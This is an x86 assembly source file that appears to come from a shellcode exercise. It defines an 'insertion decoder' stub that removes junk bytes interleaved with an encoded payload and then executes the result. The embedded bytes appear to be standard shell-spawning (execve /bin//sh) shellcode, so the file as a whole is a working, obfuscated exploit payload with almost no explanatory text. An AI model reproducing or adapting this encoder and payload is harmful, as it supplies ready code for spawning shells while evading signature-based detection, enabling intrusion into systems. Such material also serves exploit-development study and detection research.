; insertion decoder
;
; expected format:
;		byte[0] 	  --> length of shellcode
;		byte[odd]	  --> junk
;		byte[even]	--> shellcode

global _start
section .text
_start:

	jmp short stage

decoder:
	pop esi
	mov dl, byte [esi] 			; byte[0] 	--> length of shellcode
	xor ecx, ecx 				    ; counter = 0

decode:
	mov bl, byte [esi+ecx+2]	; next shellcode byte
	mov byte [esi], bl			  ; move shellcode to current position
	inc esi						        ; next position
	inc ecx 					        ; counter++
	cmp cl, dl 				        ; at the end of shellcode?
	jnz short decode 			    ; 	if not, keep decoding
	jmp short shellcode			  ; 	else, execute decoded shellcode


stage:
	call decoder
	shellcode: db 0x1c,0x42,0x31,0xf6,0xc0,0xd0,0x50,0xe0,0x68,0xb9,0x2f,0xb2,0x2f,0x7a,0x73,0xfb,0x68,0xe6,0x68,0x8c,0x2f,0x41,0x62,0xb3,0x69,0xcc,0x6e,0x35,0x8d,0x09,0x1c,0x2a,0x24,0x8b,0x50,0x6a,0x8d,0xb4,0x14,0x14,0x24,0xdc,0x53,0xe8,0x8d,0x26,0x0c,0x0b,0x24,0x97,0xb0,0xc8,0x0b,0x59,0xcd,0xcd,0x80
